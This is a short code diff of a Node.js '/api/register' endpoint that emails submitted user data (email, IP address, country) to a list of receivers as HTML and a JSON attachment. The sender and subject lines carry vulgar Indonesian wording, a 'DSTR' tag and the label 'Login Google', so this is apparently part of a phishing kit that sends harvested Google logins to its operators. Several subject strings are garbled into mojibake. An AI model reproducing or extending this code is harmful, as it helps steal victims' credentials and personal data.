@@ -529,16 +529,16 @@ app.post('/api/register', async (req, res) => {
             await transporter.sendMail({
                 from: `"𝗗𝗔𝗧𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 𝗕𝗬 𝗗𝗦𝗧𝗥🇲🇽" <${SENDER_EMAIL}>`,
                 to: receiver,
-                subject: `𝗗𝗮𝘁𝗮 𝘀𝗶 𝗸𝗼𝗻𝘁𝗼𝗹 ${flagEmoji}${countryName} ${data.ip_address || '-'}`,
+                subject: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google ${flagEmoji}${countryName} ${data.ip_address || '-'}`,
                 html: htmlContent,
                 attachments: [{
-                    filename: `registration_${Date.now()}_${receiver.split('@')[0]}.json`,
+                    filename: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google${Date.now()}_${receiver.split('@')[0]}.json`,
                     content: JSON.stringify(data, null, 2)
                 }]
             });
             console.log(`✅ Sent to: ${receiver}`);
             
-            // Small delay between sends to avoid merging
+            // Small delay betwe en sends to avoid merging
             await new Promise(resolve => setTimeout(resolve, 2000));
         }
         
